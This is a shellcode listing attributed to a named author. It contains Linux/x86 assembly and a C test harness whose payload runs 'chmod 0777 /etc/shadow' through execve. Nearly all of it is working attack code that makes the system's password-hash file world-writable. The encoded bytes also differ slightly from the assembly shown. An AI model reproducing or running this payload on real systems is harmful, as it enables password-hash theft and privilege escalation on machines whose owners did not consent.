*****************************************************
* Linux/x86 execve-chmod 0777 /etc/shadow  57 bytes *
*****************************************************
* Author: Hamza Megahed                             *
*****************************************************
* Twitter: @Hamza_Mega                              *
*****************************************************
* blog: hamza-mega[dot]blogspot[dot]com             *
*****************************************************
* E-mail: hamza[dot]megahed[at]gmail[dot]com        *
*****************************************************

xor    %eax,%eax
push   %eax
pushl  $0x776f6461
pushl  $0x68732f2f
pushl  $0x6374652f
movl   %esp,%esi
push   %eax
pushl  $0x37373730
movl   %esp,%ebp
push   %eax
pushl  $0x646f6d68
pushl  $0x632f6e69
pushl  $0x622f2f2f
mov    %esp,%ebx
pushl  %eax
pushl  %esi
pushl  %ebp
pushl  %ebx
movl   %esp,%ecx
mov    %eax,%edx
mov    $0xb,%al
int    $0x80

********************************
#include <stdio.h>
#include <string.h>

char *shellcode =
"\x31\xc0\x50\x68\x61\x64\x6f\x77\x68\x2f\x2f\x73"
"\x68\x68\x2f\x65\x74\x63\x89\xe6\x50\x68\x30\x37"
"\x37\x37\x89\xe5\x50\x68\x68\x6d\x6f\x64\x68\x69"
"\x6e\x2f\x63\x66\x68\x2f\x62\x89\xe3\x50\x56\x55"
"\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80;";




int main(void)
{
fprintf(stdout,"Length: %d\n",strlen(shellcode));
(*(void(*)()) shellcode)();
return 0;
}